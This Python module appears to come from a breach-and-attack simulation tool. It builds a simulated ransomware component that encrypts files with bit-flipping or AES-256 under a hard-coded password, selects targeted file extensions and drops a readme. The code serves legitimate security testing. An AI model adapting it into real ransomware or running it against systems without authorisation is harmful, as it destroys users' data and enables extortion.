import logging
from pprint import pformat

from common.event_queue import IAgentEventQueue
from common.types import AgentID
from infection_monkey.utils.bit_manipulators import flip_bits

from . import readme_dropper
from .aes_256_file_encryptor import AES256FileEncryptor
from .file_selectors import ProductionSafeTargetFileSelector
from .in_place_file_encryptor import InPlaceFileEncryptor
from .ransomware import Ransomware
from .ransomware_options import EncryptionAlgorithm, RansomwareOptions
from .targeted_file_extensions import TARGETED_FILE_EXTENSIONS

CHUNK_SIZE = 4096 * 24

logger = logging.getLogger(__name__)
PASSWORD = "m0nk3y"


def build_ransomware(
    options: dict,
    agent_event_queue: IAgentEventQueue,
    agent_id: AgentID,
):
    logger.debug(f"Ransomware configuration:\n{pformat(options)}")
    ransomware_options = RansomwareOptions(options)

    file_encryptor = _build_file_encryptor(ransomware_options)
    file_selector = _build_file_selector(ransomware_options.file_extension)
    leave_readme = _build_leave_readme()

    return Ransomware(
        ransomware_options, file_encryptor, file_selector, leave_readme, agent_event_queue, agent_id
    )


def _build_file_encryptor(ransomware_options: RansomwareOptions):
    file_extension = ransomware_options.file_extension
    if ransomware_options.algorithm == EncryptionAlgorithm.BIT_FLIP:
        return InPlaceFileEncryptor(
            encrypt_bytes=flip_bits, new_file_extension=file_extension, chunk_size=CHUNK_SIZE
        )
    elif ransomware_options.algorithm == EncryptionAlgorithm.AES256:
        return AES256FileEncryptor(PASSWORD, file_extension)

    raise ValueError(
        "An unsupported encryption algorithm was specified: " f"{str(ransomware_options.algorithm)}"
    )


def _build_file_selector(file_extension: str):
    targeted_file_extensions = TARGETED_FILE_EXTENSIONS.copy()
    if file_extension:
        targeted_file_extensions.discard(file_extension)

    return ProductionSafeTargetFileSelector(targeted_file_extensions)


def _build_leave_readme():
    return readme_dropper.leave_readme
